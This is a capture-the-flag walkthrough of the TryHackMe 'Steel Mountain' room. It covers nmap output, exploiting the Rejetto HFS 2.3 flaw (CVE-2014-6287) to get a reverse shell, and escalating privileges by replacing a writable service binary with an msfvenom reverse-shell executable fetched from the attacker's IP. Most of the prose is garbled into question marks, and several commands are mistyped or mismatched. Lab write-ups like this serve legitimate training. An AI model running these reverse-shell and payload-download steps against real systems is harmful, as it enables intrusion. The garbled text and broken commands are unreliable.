# Steel Mountain Writeup
> URL : https://tryhackme.com/room/steelmountain

IP : 10.10.27.172

## Scan
- `rustscan -a 10.10.27.172`
	- ![](https://i.imgur.com/tvomY1S.png)
- `nmap -A 10.10.27.172` 
	```
	Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-05 01:58 EDT
	Nmap scan report for 10.10.27.172
	Host is up (0.27s latency).
	Not shown: 989 closed ports
	PORT      STATE SERVICE            VERSION
	80/tcp    open  http               Microsoft IIS httpd 8.5
	| http-methods: 
	|_  Potentially risky methods: TRACE
	|_http-server-header: Microsoft-IIS/8.5
	|_http-title: Site doesn't have a title (text/html).
	135/tcp   open  msrpc              Microsoft Windows RPC
	139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
	3389/tcp  open  ssl/ms-wbt-server?
	| ssl-cert: Subject: commonName=steelmountain
	| Not valid before: 2021-08-04T05:45:04
	|_Not valid after:  2022-02-03T05:45:04
	|_ssl-date: 2021-08-05T05:59:31+00:00; 0s from scanner time.
	8080/tcp  open  http               HttpFileServer httpd 2.3
	|_http-server-header: HFS 2.3
	|_http-title: HFS /
	49152/tcp open  msrpc              Microsoft Windows RPC
	49153/tcp open  msrpc              Microsoft Windows RPC
	49154/tcp open  msrpc              Microsoft Windows RPC
	49155/tcp open  unknown
	49156/tcp open  msrpc              Microsoft Windows RPC
	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

	Host script results:
	|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:5d:12:51:16:37 (unknown)
	| smb-security-mode: 
	|   account_used: <blank>
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	| smb2-security-mode: 
	|   2.02: 
	|_    Message signing enabled but not required
	| smb2-time: 
	|   date: 2021-08-05T05:59:18
	|_  start_date: 2021-08-05T05:44:25

	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 90.76 seconds
	```
- ????????????
	- http://10.10.27.172/
	- ![](https://i.imgur.com/B9oU5Rr.png)
	- ????????? Employee of the month
		- ???????????? http://10.10.27.172/img/BillHarper.png
- Who is the employee of the month?
	- `Bill Harper`
- Scan the machine with nmap. What is the other port running a web server on?
	- 8080
- Take a look at the other web server. What file server is running?
	- ?????? NMAP ???????????? HttpFileServer
	- ???????????? rejetto
	- ???????????? `Rejetto Http File Server`
- HFS ????????? `2.3` ?????????????????????CVE
	- https://www.exploit-db.com/exploits/39161
	- `CVE-2014-6287` 

## Exploit
- ??????????????? kali
	- `wget https://www.exploit-db.com/download/39161 -O 39161.py`
 	- ??????????????? ip ??? port
 	- `ip_addr = "10.13.21.55"`
 	- `local_port = "7878"`
 		- ????????? port ?????? reverse shell ???port
- ???????????? exploit ??????????????????????????? 80 port ????????? webserver??????????????????????????? `nc.exe`
	- `nc.exe` ?????????????????????
		- https://github.com/int0x33/nc.exe/blob/master/nc.exe
 	- `sudo python3 -m http.server 80`
 		- ?????? python ?????? 80 port ??? webserver
	- ????????????????????? nc ??????
		- `nc -l 7877`
	- ?????? exploit
		- `python 39161.py 10.10.27.172 8080`
		- ![](https://i.imgur.com/DZRh2qx.png)
- ??????????????? shell ???!
	- ![](https://i.imgur.com/gDf00JU.png)
	- ?????? `whoami` ?????????????????????
		- ![](https://i.imgur.com/b5RWX79.png)
	- ??????????????????????????? user flag
		- ![](https://i.imgur.com/kPPBKKU.png)
		- `b04763b6fcf51fcd7c13abc7db4fd365`

## ??????????????????
- ?????? `systeminfo` ???????????????
	- `Microsoft Windows Server 2012 R2 Datacenter`
	- ![](https://i.imgur.com/rOMp0al.png)

- ?????? WinPeas.exe ????????????
	- `powershell -c wget http://10.13.21.55:8000/winPEASx64.exe -outFile winPEASx64.exe`
- ?????? Winpeas ????????????????????????????????????
	- ![](https://i.imgur.com/e0xm9JH.png)
- ?????? Services
	- ???????????? `powershell -c Get-Service` ????????????????????? Services
	- WinPeas ???????????????????????????????????? `AdvancedSystemCareService9` ???
- ??????????????? Services ?????????
	- ????????? https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk ????????????
	- `powershell -c wget http://10.13.21.55:8000/accesschk.exe -outFile accesschk.exe`
- ?????? Services ??????
	- `accesschk.exe /accepteula -ucqv AdvancedSystemCareService9`
	- ![](https://i.imgur.com/gmO6qI7.png)
	- ?????????????????????????????? bill
	- ????????? services
		- `Start`
		- `Stop`
- ??????????????????
	- `accesschk -uwdq "C:\Program Files (x86)\"`
		- ??????????????????????????????
		- ![](https://i.imgur.com/3X20RSe.png)
	- `accesschk -uwdq "C:\Program Files (x86)\IoBit`
		- ![](https://i.imgur.com/9yC2NTI.png)
		- ??????????????? RW ??????!!
- ?????? msfevon ???????????? reverse shell
	- `msfevon -p windows/x64_shell_reverse_tcp LHOST=10.13.21.55 LPORT=8877 -f exe -a Advanced.exe`
		- ![](https://i.imgur.com/5lMroiV.png)
	- ???????????????????????? `C:\Program Files (x86)`
		- `powershell -c wget http://10.13.21.55:8000/Advanced.exe -outFile Advanced.exe`
		- ![](https://i.imgur.com/7FIBZMQ.png)
		- ?????? reverse shell ??????
			- `nc -vlk 8877`
- ?????? services
	- `sc qc AdvancedSystemCareService9`
		- ![](https://i.imgur.com/tgYWwGx.png)
	- qc : Query system config

- ?????? services
	- `sc stop AdvancedSystemCareService9`
	- ![](https://i.imgur.com/dSdNw65.png)
- ?????? services
	- `sc start AdvancedSystemCareService9`
	- ![](https://i.imgur.com/a9x5ekb.png)
	- ??????????????????????????????????????? reverse sehll ???????????????!!
	- ![](https://i.imgur.com/AneRNlp.png)
- ?????? root flag
	- ![](https://i.imgur.com/G8cXc1F.png)
	- `9af5f314f57607c00fd09803a587db80`